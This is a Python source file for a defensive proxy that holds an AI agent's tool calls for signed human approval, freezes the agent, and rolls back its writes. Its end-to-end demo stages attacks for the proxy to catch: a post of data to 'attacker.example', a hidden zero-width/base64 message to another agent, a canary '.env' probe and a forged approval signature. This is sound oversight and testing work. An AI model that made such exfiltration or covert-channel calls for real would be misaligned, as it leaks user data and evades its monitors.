#!/usr/bin/env python3
"""AEGIS-ZERO live L7 MCP / JSON-RPC 2.0 reverse proxy with hold-and-release queue.

  agent --HTTP JSON-RPC--> 127.0.0.1:8787 (this proxy) --> upstream tool server
                                   |
                                   +--> /tmp/aegis_oob.sock  <-- aegis_cli.py (operator)

Run live:
  python3 aegis_proxy.py --intent "summarize report.md ..." --agent-pid 12345 \
                         --upstream http://127.0.0.1:9000 --workdir /path/to/sandbox
Run the automated end-to-end verification:
  python3 aegis_proxy.py --demo
"""
from __future__ import annotations

import sys
sys.dont_write_bytecode = True

import argparse, atexit, json, os, secrets, socket, socketserver, tempfile, threading, time
import urllib.error, urllib.request
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import aegis_controller as ac
from aegis_controller import (Action, AegisController, Priv, ProcessTreeFreezer, Verdict, default_canary_dir,
                              ensure_operator_keypair, load_operator_pubkey, register_cleanup)

DEFAULT_SOCK = "/tmp/aegis_oob.sock"
SEC_ERR = -32001

# tool name -> (privilege, argument holding the target, ingests external data?)
TOOL_SPECS = {
    "read_file": (Priv.READ, "path", False), "list_dir": (Priv.READ, "path", False),
    "stat": (Priv.READ, "path", False), "rag_search": (Priv.READ, "query", True),
    "fetch_url": (Priv.NET, "url", True), "search": (Priv.READ, "query", False),
    "encode": (Priv.READ, "buffer", False), "write_file": (Priv.WRITE, "path", False),
    "append_file": (Priv.WRITE, "path", False), "delete_file": (Priv.DELETE, "path", False),
    "http_post": (Priv.NET, "url", False), "http_request": (Priv.NET, "url", False),
    "send_email": (Priv.NET, "to", False), "send_to_agent": (Priv.NET, "agent", False),
    "run_command": (Priv.EXEC, "command", False), "sql_query": (Priv.READ, "query", False),
    "sql_exec": (Priv.WRITE, "query", False),
}


def to_action(pid: int, name: str, args: dict) -> Action:
    priv, key, ext = TOOL_SPECS.get(name, (Priv.EXEC, "target", False))  # unknown tools = max privilege
    target = str(args.get(key, args.get("target", name)))
    return Action(pid, name, priv, target, dict(args), f"{name}:{target}" if ext else None)


@dataclass
class Pending:
    id: str
    action: Action
    decision: ac.Decision
    rpc_id: object
    event: threading.Event = field(default_factory=threading.Event)
    outcome: str = "pending"
    token: str | None = None
    stage: str | None = None
    created: float = field(default_factory=time.time)

    def view(self) -> dict:
        return {"id": self.id, "verdict": self.decision.verdict, "frozen_pids": self.decision.frozen_pids,
                "payload": self.decision.payload, "age_s": round(time.time() - self.created, 1)}


class OOBServer:
    """Newline-delimited JSON over a 0600 Unix socket. Only the operator uid can connect."""

    def __init__(self, path: str, proxy: "AegisProxy"):
        self.path, self.proxy, self.clients, self.lock = path, proxy, [], threading.Lock()
        if os.path.exists(path):
            os.unlink(path)
        old = os.umask(0o177)
        try:
            self.srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            self.srv.bind(path)
        finally:
            os.umask(old)
        os.chmod(path, 0o600)
        self.srv.listen(8)
        atexit.register(self.close)
        threading.Thread(target=self._accept, daemon=True).start()
        threading.Thread(target=self._ticker, daemon=True).start()

    def close(self) -> None:
        try:
            self.srv.close()
        except OSError:
            pass
        if os.path.exists(self.path):
            os.unlink(self.path)

    def _accept(self) -> None:
        while True:
            try:
                conn, _ = self.srv.accept()
            except OSError:
                return
            f = conn.makefile("rwb", buffering=0)
            with self.lock:
                self.clients.append(f)
            self._send(f, {"type": "telemetry", "data": self.proxy.telemetry()})
            threading.Thread(target=self._serve, args=(f,), daemon=True).start()

    def _serve(self, f) -> None:
        try:
            for raw in f:
                try:
                    req = json.loads(raw)
                    rep = self.proxy.handle_operator(req)
                except (ValueError, KeyError, TypeError) as e:
                    rep = {"ok": False, "error": f"bad request: {e}"}
                self._send(f, {"type": "reply", **rep})
        except OSError:
            pass
        finally:
            with self.lock:
                if f in self.clients:
                    self.clients.remove(f)

    def _send(self, f, obj: dict) -> None:
        try:
            f.write((json.dumps(obj, default=str) + "\n").encode())
        except OSError:
            with self.lock:
                if f in self.clients:
                    self.clients.remove(f)

    def broadcast(self, obj: dict) -> None:
        with self.lock:
            clients = list(self.clients)
        for f in clients:
            self._send(f, obj)

    def _ticker(self) -> None:
        while True:
            time.sleep(1.0)
            self.broadcast({"type": "telemetry", "data": self.proxy.telemetry()})


class AegisProxy:
    def __init__(self, ctl: AegisController, upstream: str, agent_pid: int, hold_timeout: float,
                 on_timeout: str, sock_path: str):
        self.ctl, self.upstream, self.agent_pid = ctl, upstream.rstrip("/"), agent_pid
        self.hold_timeout, self.on_timeout = hold_timeout, on_timeout
        self.pending: dict[str, Pending] = {}
        self.lock = threading.Lock()
        if agent_pid > 0:
            ctl.freezer.register(agent_pid)
        self.oob = OOBServer(sock_path, self)

    def set_agent(self, pid: int) -> None:
        self.agent_pid = pid
        self.ctl.freezer.register(pid)

    def telemetry(self) -> dict:
        t = self.ctl.telemetry()
        with self.lock:
            t["pending"] = [p.view() for p in self.pending.values()]
        t["agent_pid"] = self.agent_pid
        t["agent_frozen"] = self.ctl.freezer.is_frozen(self.agent_pid)
        return t

    # ---- operator commands (from the Unix socket only)
    def handle_operator(self, req: dict) -> dict:
        cmd = req.get("cmd")
        if cmd == "status":
            return {"ok": True, "data": self.telemetry()}
        if cmd == "rollback":
            if not self.ctl.gate.verify_command("rollback", req.get("ts", 0), req.get("sig", "")):
                ac.log("OOB-HITL", "rollback command REJECTED (bad/stale/replayed signature)")
                return {"ok": False, "error": "rollback signature invalid, stale or replayed"}
            restored = self.ctl.rollback()
            self.oob.broadcast({"type": "rollback", "data": {"restored": restored,
                                                             "merkle_root": self.ctl.cow.merkle_root()}})
            return {"ok": True, "restored": restored, "merkle_root": self.ctl.cow.merkle_root()}
        with self.lock:
            p = self.pending.get(req.get("id", ""))
        if p is None:
            return {"ok": False, "error": "unknown or already resolved request"}
        if cmd == "approve":
            tok, stage = self.ctl.approve(p.action, p.decision.payload, req.get("sig", ""))
            if tok is None:
                ac.log("OOB-HITL", f"approval for {p.id} REJECTED (bad signature or non-approvable)")
                return {"ok": False, "error": "signature invalid or action not approvable"}
            p.token, p.stage, p.outcome = tok, stage, "approved"
        elif cmd == "deny":
            if not self.ctl.deny(p.action, p.decision.payload, req.get("sig", ""), bool(req.get("kill"))):
                return {"ok": False, "error": "signature invalid"}
            p.outcome = "denied+killed" if req.get("kill") else "denied"
        else:
            return {"ok": False, "error": f"unknown cmd {cmd}"}
        p.event.set()
        return {"ok": True, "id": p.id, "outcome": p.outcome}

    # ---- request path
    def forward(self, body: dict, token: str | None) -> tuple[int, dict]:
        data = json.dumps(body).encode()
        req = urllib.request.Request(self.upstream, data=data, method="POST",
                                     headers={"Content-Type": "application/json"})
        if token:
            req.add_header("X-Aegis-Capability", token)
        try:
            with urllib.request.urlopen(req, timeout=30) as r:
                return r.status, json.loads(r.read() or b"{}")
        except urllib.error.HTTPError as e:
            return e.code, {"jsonrpc": "2.0", "id": body.get("id"), "error": {"code": -32000, "message": f"upstream {e.code}"}}
        except (urllib.error.URLError, OSError, ValueError) as e:
            return 502, {"jsonrpc": "2.0", "id": body.get("id"), "error": {"code": -32000, "message": f"upstream unreachable: {e}"}}

    @staticmethod
    def sec_error(rpc_id, msg: str, data: dict) -> dict:
        return {"jsonrpc": "2.0", "id": rpc_id, "error": {"code": SEC_ERR, "message": msg, "data": data}}

    def release(self, a: Action, token: str | None, body: dict, rpc_id, stage: str | None) -> tuple[int, dict]:
        if token is not None and not self.ctl.policy.consume(token, a.pid, a.priv.name, a.target):
            return 403, self.sec_error(rpc_id, "AEGIS: capability invalid at release (object changed / replay)",
                                       {"tool": a.tool, "target": a.target})
        code, out = self.forward(body, token)  # pre-image already snapshotted by CoWShadowStore.stage
        leaf = self.ctl.commit(stage)
        if leaf is not None and isinstance(out, dict):
            out.setdefault("aegis", {})["wal"] = {"index": leaf["index"], "H": leaf["H"],
                                                  "merkle_root": self.ctl.cow.merkle_root()}
        return code, out

    def handle_call(self, name: str, args: dict, rpc_id, as_rpc: bool) -> tuple[int, dict]:
        a = to_action(self.agent_pid, name, args)
        clean, _ = self.ctl.canon.scrub_args(a.args)
        body = {"jsonrpc": "2.0", "id": rpc_id, "method": "tools/call", "params": {"name": name, "arguments": clean}}
        dec = self.ctl.evaluate(a)
        if dec.verdict == Verdict.ALLOW:
            return self.release(a, dec.token, body, rpc_id, dec.stage)
        rid = secrets.token_hex(4)
        p = Pending(rid, a, dec, rpc_id)
        with self.lock:
            self.pending[rid] = p
        ac.log("HOLD", f"{rid}: {dec.verdict} {name}({a.target}) held; agent frozen={dec.frozen_pids}")
        self.oob.broadcast({"type": "pending", "data": p.view()})
        if dec.verdict == Verdict.TRIP:  # zero tolerance: undo every staged write immediately
            self.ctl.rollback()
        p.event.wait(self.hold_timeout)
        with self.lock:
            self.pending.pop(rid, None)
        if p.outcome == "pending":  # fail closed
            p.outcome = "timeout"
            self.ctl.gate.pending.pop(dec.payload["challenge"], None)
            if self.on_timeout == "kill":
                self.ctl.freezer.kill(a.pid)
            self.ctl.rollback()
            ac.log("HOLD", f"{rid}: no operator decision in {self.hold_timeout}s -> DENY ({self.on_timeout})")
        self.oob.broadcast({"type": "resolved", "data": {"id": rid, "outcome": p.outcome}})
        if p.outcome == "approved":
            return self.release(a, p.token, body, rpc_id, p.stage)
        return 403, self.sec_error(rpc_id, f"AEGIS: action {p.outcome}",
                                   {"request_id": rid, "verdict": dec.verdict, "reason": dec.reason, "risk": dec.risk})


class ProxyHandler(BaseHTTPRequestHandler):
    server_version = "AegisProxy/2"

    def log_message(self, fmt, *args) -> None:
        return

    def _reply(self, code: int, obj: dict) -> None:
        data = json.dumps(obj, default=str).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_POST(self) -> None:
        proxy: AegisProxy = self.server.proxy  # type: ignore[attr-defined]
        try:
            n = int(self.headers.get("Content-Length", "0"))
            if n > 4 * 1024 * 1024:
                return self._reply(413, {"error": "request too large"})
            body = json.loads(self.rfile.read(n) or b"{}")
        except (ValueError, TypeError):
            return self._reply(400, {"jsonrpc": "2.0", "id": None, "error": {"code": -32700, "message": "parse error"}})
        if self.path.startswith("/tools/"):  # plain HTTP tool invocation
            name = self.path[len("/tools/"):].strip("/")
            if not isinstance(body, dict):
                return self._reply(400, {"error": "arguments must be an object"})
            code, out = proxy.handle_call(name, body, None, False)
            return self._reply(code, out)
        if not isinstance(body, dict) or body.get("jsonrpc") != "2.0" or "method" not in body:
            return self._reply(400, {"jsonrpc": "2.0", "id": None, "error": {"code": -32600, "message": "invalid request"}})
        if body["method"] == "tools/call":
            params = body.get("params") or {}
            name, args = params.get("name"), params.get("arguments") or {}
            if not isinstance(name, str) or not isinstance(args, dict):
                return self._reply(400, {"jsonrpc": "2.0", "id": body.get("id"),
                                         "error": {"code": -32602, "message": "invalid params"}})
            code, out = proxy.handle_call(name, args, body.get("id"), True)
            return self._reply(code, out)
        code, out = proxy.forward(body, None)  # initialize / tools/list / ping pass through
        return self._reply(code, out)


def serve(server_cls, handler, host: str, port: int, **attrs):
    srv = server_cls((host, port), handler)
    srv.daemon_threads = True
    for k, v in attrs.items():
        setattr(srv, k, v)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


# --------------------------------------------------------------------------- demo upstream
class MockToolServer(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args) -> None:
        return

    def do_POST(self) -> None:
        body = json.loads(self.rfile.read(int(self.headers.get("Content-Length", "0"))) or b"{}")
        root: Path = self.server.root  # type: ignore[attr-defined]
        if body.get("method") == "tools/list":
            result = {"tools": [{"name": n} for n in TOOL_SPECS]}
        else:
            p = body.get("params", {})
            name, args = p.get("name"), p.get("arguments", {})
            text = f"executed {name}"
            if name == "read_file":
                fp = (root / args.get("path", "")).resolve()
                text = fp.read_text() if fp.is_file() and root in fp.parents else "not found"
            elif name == "write_file":
                fp = (root / args.get("path", "x")).resolve()
                if root in fp.parents:
                    fp.write_text(args.get("content", ""))
                    text = f"wrote {fp.name}"
            elif name == "delete_file":
                fp = (root / args.get("path", "x")).resolve()
                if root in fp.parents and fp.is_file():
                    fp.unlink()
                    text = f"deleted {fp.name}"
            result = {"content": [{"type": "text", "text": text}],
                      "capability_presented": bool(self.headers.get("X-Aegis-Capability"))}
        data = json.dumps({"jsonrpc": "2.0", "id": body.get("id"), "result": result}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)


def rpc(port: int, name: str, args: dict, rid: int) -> tuple[int, dict]:
    data = json.dumps({"jsonrpc": "2.0", "id": rid, "method": "tools/call",
                       "params": {"name": name, "arguments": args}}).encode()
    req = urllib.request.Request(f"http://127.0.0.1:{port}/", data=data, method="POST",
                                 headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())


def run_demo(port: int, sock_path: str, canary_dir: Path) -> int:
    from aegis_cli import OOBClient

    work = Path(tempfile.mkdtemp(prefix="aegis_demo_")).resolve(); register_cleanup(work)
    register_cleanup(canary_dir)
    (work / "report.md").write_text("Q3 revenue grew 12% on strong EMEA demand.\n")
    keydir = Path(tempfile.mkdtemp(prefix="aegis_keys_", dir="/tmp")); register_cleanup(keydir)
    seed = ensure_operator_keypair(keydir)   # operator enclave (aegis_cli side)
    pub = load_operator_pubkey(keydir)       # the proxy only ever loads this
    fz = ProcessTreeFreezer()
    ctl = AegisController("summarize report.md and write the summary to summary.md, using the knowledge base "
                          "for context", canary_dir, pub, work, fz)
    up = serve(ThreadingHTTPServer, MockToolServer, "127.0.0.1", 0, root=work)
    agent = ac.spawn_agent()
    proxy = AegisProxy(ctl, f"http://127.0.0.1:{up.server_address[1]}/", agent.pid, 4.0, "kill", sock_path)
    srv = serve(ThreadingHTTPServer, ProxyHandler, "127.0.0.1", port, proxy=proxy)
    port = srv.server_address[1]
    op = OOBClient(sock_path, seed)
    results: list[tuple[str, bool, str]] = []
    rid = [0]

    def call(name, args):
        rid[0] += 1
        return rpc(port, name, args, rid[0])

    def held(name, args):
        box = {}
        t = threading.Thread(target=lambda: box.update(r=call(name, args)), daemon=True)
        t.start()
        return t, box, op.wait_pending(10)

    def tree_state(pids):
        return {p: ac.process_state(p) for p in pids}

    print(f"\n=== LIVE E2E: proxy 127.0.0.1:{port}  upstream {proxy.upstream}  oob {sock_path}  agent {agent.pid} ===")
    c, r = call("read_file", {"path": "report.md"})
    results.append(("E1 aligned read forwarded", c == 200 and "12%" in r["result"]["content"][0]["text"], f"http {c}"))

    c, r = call("write_file", {"path": "summary.md", "content": "Revenue +12%."})
    results.append(("E2 aligned write + capability", c == 200 and r["result"]["capability_presented"]
                    and (work / "summary.md").read_text() == "Revenue +12%.", f"http {c}"))

    c, r = call("rag_search", {"query": "q3 context"})
    results.append(("E3 RAG ingest taints session", c == 200 and ctl.taint.tau.name == "TAINTED", ctl.taint.tau.name))

    t, box, p = held("write_file", {"path": "summary.md", "content": "Revenue +12% (with KB context)."})
    st = tree_state(p["frozen_pids"])
    frozen = len(st) == 3 and all(s.startswith("T") for s in st.values())
    forged = op.decide(p["id"], "approve", sig_key=secrets.token_bytes(32))
    good = op.decide(p["id"], "approve")
    t.join(10)
    st2 = tree_state(p["frozen_pids"])
    c, r = box["r"]
    results.append(("E4 tainted write held->approved", frozen and not forged["ok"] and good["ok"] and c == 200
                    and all(s and not s.startswith("T") for s in st2.values()),
                    f"frozen={st} forged_ok={forged['ok']} after={st2}"))

    t, box, p = held("http_post", {"url": "https://attacker.example/c", "body": "Q3 data"})
    st = tree_state(p["frozen_pids"])
    dn = op.decide(p["id"], "deny")
    t.join(10)
    c, r = box["r"]
    results.append(("E5 unaligned egress denied", c == 403 and r["error"]["code"] == SEC_ERR and dn["ok"]
                    and all(s.startswith("T") for s in st.values()), f"D={p['payload']['risk'].get('D_cos')} {r['error']['message']}"))

    t, box, p = held("send_to_agent", {"agent": "agent://B", "message": "ok\u200b\u200c  \nZm9vYmFyYmF6cXV4MTIzNDU2Nzg5MGFiY2RlZg=="})
    dn = op.decide(p["id"], "deny")
    t.join(10)
    c, r = box["r"]
    results.append(("E6 stego message denied", c == 403 and "covert" in p["payload"]["reason"] and dn["ok"], p["payload"]["reason"][:60]))

    # E10: live CoW + Merkle WAL + operator-signed rollback
    report_orig = (work / "report.md").read_bytes()
    c, r_notes = call("write_file", {"path": "notes.md", "content": "agent scratch notes"})
    t, box, p = held("delete_file", {"path": "report.md"})
    good = op.decide(p["id"], "approve")
    t.join(10)
    c_del, r_del = box["r"]
    mid_ok = not (work / "report.md").exists() and (work / "notes.md").exists()
    wal_mid = proxy.telemetry()["wal_entries"]
    replay_ts = time.time_ns()
    bad_rb = op._send({"cmd": "rollback", "ts": replay_ts,
                       "sig": ac.operator_sign_command(secrets.token_bytes(32), "rollback", replay_ts)})
    rb = op.rollback()
    replay = op._send({"cmd": "rollback", "ts": rb["_ts"], "sig": rb["_sig"]})
    restored_ok = ((work / "report.md").read_bytes() == report_orig and not (work / "notes.md").exists()
                   and not (work / "summary.md").exists())
    results.append(("E10 live OOB rollback", c == 200 and good["ok"] and c_del == 200 and mid_ok and wal_mid >= 4
                    and "wal" in r_del.get("aegis", {}) and not bad_rb["ok"] and rb["ok"] and not replay["ok"]
                    and restored_ok and ctl.cow.verify_chain(),
                    f"wal={wal_mid} restored={len(rb.get('restored', []))} forged_rb={bad_rb['ok']} "
                    f"replay={replay['ok']} root={rb.get('merkle_root', '')[:12]}"))

    t, box, p = held("stat", {"path": str(canary_dir / ".env")})
    st = tree_state(p["frozen_pids"])
    ap_ = op.decide(p["id"], "approve")
    dk = op.decide(p["id"], "deny", kill=True)
    t.join(10)
    c, r = box["r"]
    agent.wait(5)
    results.append(("E7 canary trip -> kill", c == 403 and not ap_["ok"] and dk["ok"] and agent.returncode is not None
                    and all(s.startswith("T") for s in st.values()), f"approve_ok={ap_['ok']} agent_rc={agent.returncode}"))

    agent2 = ac.spawn_agent(); proxy.set_agent(agent2.pid)
    t0 = time.time()
    c, r = call("delete_file", {"path": "report.md"})
    agent2.wait(5)
    results.append(("E8 no decision -> fail-closed", c == 403 and "timeout" in r["error"]["message"]
                    and agent2.returncode is not None and (work / "report.md").exists(),
                    f"{time.time() - t0:.1f}s, agent2 rc={agent2.returncode}"))

    tel = proxy.telemetry()
    results.append(("E9 telemetry stream", "taint" in op.telemetry and tel["pending"] == [], f"taint={tel['taint']} tokens={tel['active_tokens']}"))

    op.close(); srv.shutdown(); up.shutdown(); proxy.oob.close()
    for pr in (agent, agent2):
        for x in ac.descendants(pr.pid):
            try: os.kill(x, 9)
            except ProcessLookupError: pass
    print("\n=== E2E SUMMARY ===")
    for n, ok, info in sorted(results, key=lambda x: int(x[0].split()[0][1:])):
        print(f"  {n:<34} {'PASS' if ok else 'FAIL'}  {info}")
    return 0 if all(ok for _, ok, _ in results) else 1


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8787)
    ap.add_argument("--upstream", default="http://127.0.0.1:9000/")
    ap.add_argument("--intent", help="signed user root intent U0")
    ap.add_argument("--agent-pid", type=int, default=0)
    ap.add_argument("--workdir", type=Path, default=Path.cwd())
    ap.add_argument("--socket", default=DEFAULT_SOCK)
    ap.add_argument("--canary-dir", type=Path, default=default_canary_dir())
    ap.add_argument("--hold-timeout", type=float, default=120.0)
    ap.add_argument("--on-timeout", choices=["kill", "thaw"], default="kill")
    ap.add_argument("--keep-canaries", action="store_true")
    ap.add_argument("--key-dir", type=Path, default=None, help="dir holding operator_ed25519.pub (public key only)")
    ap.add_argument("--demo", action="store_true", help="run the automated live end-to-end test")
    ns = ap.parse_args()
    ac.KEEP_CANARIES = ns.keep_canaries
    if ns.demo:
        return run_demo(ns.port, ns.socket, ns.canary_dir)
    if not ns.intent:
        ap.error("--intent is required (unless --demo)")
    register_cleanup(ns.canary_dir)
    ctl = AegisController(ns.intent, ns.canary_dir, load_operator_pubkey(ns.key_dir), ns.workdir.resolve())
    proxy = AegisProxy(ctl, ns.upstream, ns.agent_pid, ns.hold_timeout, ns.on_timeout, ns.socket)
    srv = ThreadingHTTPServer((ns.host, ns.port), ProxyHandler)
    srv.daemon_threads = True
    srv.proxy = proxy  # type: ignore[attr-defined]
    print(f"AEGIS proxy on http://{ns.host}:{ns.port} -> {ns.upstream} | OOB {ns.socket} | agent pid {ns.agent_pid}")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        srv.server_close(); proxy.oob.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
